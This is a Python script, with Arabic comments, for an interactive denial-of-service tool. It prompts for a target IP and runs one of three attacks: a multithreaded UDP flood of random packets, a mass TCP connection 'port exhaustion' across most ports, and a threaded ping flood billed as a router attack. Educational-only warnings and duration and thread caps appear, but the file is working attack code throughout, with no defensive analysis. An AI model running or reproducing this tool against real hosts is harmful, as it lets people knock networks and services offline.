Enterimport os
import socket
import threading
import time
import random
from colorama import Fore, Style

# تحذير: هذه الوحدة لأغراض تعليمية فقط. الاستخدام غير القانوني محظور.

# قفل لمنع التداخل عند الطباعة
print_lock = threading.Lock()

def safe_print(msg):
    with print_lock:
        print(msg)

class AttackThread(threading.Thread):
    def __init__(self, target_ip, target_port, duration, packet_size=1024):
        super().__init__()
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.packet_size = packet_size
        self.stop_flag = threading.Event()
        self.packets_sent = 0

    def stop(self):
        self.stop_flag.set()

    def run(self):
        raise NotImplementedError

class UDPFloodThread(AttackThread):
    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        start = time.time()
        while not self.stop_flag.is_set() and (time.time() - start) < self.duration:
            try:
                data = os.urandom(self.packet_size)
                sock.sendto(data, (self.target_ip, self.target_port))
                self.packets_sent += 1
            except:
                pass
        sock.close()

class PortExhaustionThread(threading.Thread):
    def __init__(self, target_ip, start_port, end_port, timeout=0.1):
        super().__init__()
        self.target_ip = target_ip
        self.start_port = start_port
        self.end_port = end_port
        self.timeout = timeout
        self.connections = []
        self.stop_flag = threading.Event()

    def stop(self):
        self.stop_flag.set()

    def run(self):
        for port in range(self.start_port, self.end_port):
            if self.stop_flag.is_set():
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect_ex((self.target_ip, port))
                self.connections.append(s)
            except:
                pass

class RouterAttackThread(threading.Thread):
    def __init__(self, target_ip, duration):
        super().__init__()
        self.target_ip = target_ip
        self.duration = duration
        self.stop_flag = threading.Event()
        self.packets_sent = 0

    def stop(self):
        self.stop_flag.set()

    def run(self):
        start = time.time()
        while not self.stop_flag.is_set() and (time.time() - start) < self.duration:
            os.system(f"ping -c 1 -W 1 {self.target_ip} > /dev/null 2>&1")
            self.packets_sent += 1

def udp_flood(target_ip, target_port, duration, threads=10):
    """UDP flood using multiple threads"""
    print(Fore.YELLOW + f"[*] Starting UDP flood on {target_ip}:{target_port} for {duration} seconds with {threads} threads" + Style.RESET_ALL)
    flood_threads = []
    for _ in range(threads):
        t = UDPFloodThread(target_ip, target_port, duration)
        t.start()
        flood_threads.append(t)

    # انتظار المدة المحددة
    time.sleep(duration)

    # إيقاف جميع الخيوط
    total_packets = 0
    for t in flood_threads:
        t.stop()
        t.join()
        total_packets += t.packets_sent

    print(Fore.GREEN + f"[+] UDP flood completed. Total packets sent: {total_packets}" + Style.RESET_ALL)

def port_exhaustion(target_ip, duration, port_range=(1024, 65535)):
    """Port exhaustion using multiple threads to open many connections"""
    print(Fore.YELLOW + f"[*] Starting port exhaustion on {target_ip} for {duration} seconds" + Style.RESET_ALL)
    exhaustion_threads = []
    step = 1000  # كل خيط يتولى 1000 منفذ
    for start in range(port_range[0], port_range[1], step):
        end = min(start + step, port_range[1])
        t = PortExhaustionThread(target_ip, start, end, timeout=0.1)
        t.start()
        exhaustion_threads.append(t)

    time.sleep(duration)

    total_connections = 0
    for t in exhaustion_threads:
        t.stop()
        t.join()
        total_connections += len(t.connections)

    print(Fore.GREEN + f"[+] Port exhaustion finished. Opened {total_connections} connections." + Style.RESET_ALL)

    # إغلاق جميع الاتصالات المفتوحة
    for t in exhaustion_threads:
        for s in t.connections:
            try:
                s.close()
            except:
                pass

def router_attack(target_ip, duration, threads=5):
    """Router attack using multiple threads (ICMP flood)"""
    print(Fore.YELLOW + f"[*] Starting router attack on {target_ip} for {duration} seconds with {threads} threads" + Style.RESET_ALL)
    attack_threads = []
    for _ in range(threads):
        t = RouterAttackThread(target_ip, duration)
        t.start()
        attack_threads.append(t)

    time.sleep(duration)

    total_packets = 0
    for t in attack_threads:
        t.stop()
        t.join()
        total_packets += t.packets_sent

    print(Fore.GREEN + f"[+] Router attack completed. Total ICMP packets sent: {total_packets}" + Style.RESET_ALL)

def main():
    print(Fore.RED + "⚠️  WARNING: This module is for educational purposes only!" + Style.RESET_ALL)
    print(Fore.RED + "⚠️  Unauthorized use against systems you do not own is illegal." + Style.RESET_ALL)
    print(Fore.CYAN + "\nChoose attack type:")
    print("1. UDP Flood (IP Flooding)")
    print("2. Port Exhaustion")
    print("3. Router Attack (ICMP flood)")
    attack_choice = input(Fore.MAGENTA + "Enter choice (1-3): ").strip()

    target = input(Fore.MAGENTA + "Enter target IP address: ").strip()
    if not target:
        print(Fore.RED + "No target entered.")
        return

    # التحقق من صحة IP
    import re
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
        print(Fore.RED + "Invalid IP address.")
        return

    # إدخال المدة
    try:
        duration = int(input(Fore.MAGENTA + "Enter duration in seconds (max 30): ") or "10")
        if duration > 30:
            print(Fore.YELLOW + "Duration limited to 30 seconds for educational safety.")
            duration = 30
    except:
        duration = 10

    if attack_choice == '1':
        port = int(input(Fore.MAGENTA + "Enter target port (e.g., 80): ") or "80")
        threads = int(input(Fore.MAGENTA + "Enter number of threads (1-20, default 10): ") or "10")
        if threads > 20:
            threads = 20
        udp_flood(target, port, duration, threads)
    elif attack_choice == '2':
        port_exhaustion(target, duration)
    elif attack_choice == '3':
        threads = int(input(Fore.MAGENTA + "Enter number of threads (1-20, default 5): ") or "5")
        if threads > 20:
            threads = 20
        router_attack(target, duration, threads)
    else:
        print(Fore.RED + "Invalid choice.")

    input(Fore.CYAN + "\nPress Enter to continue..." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
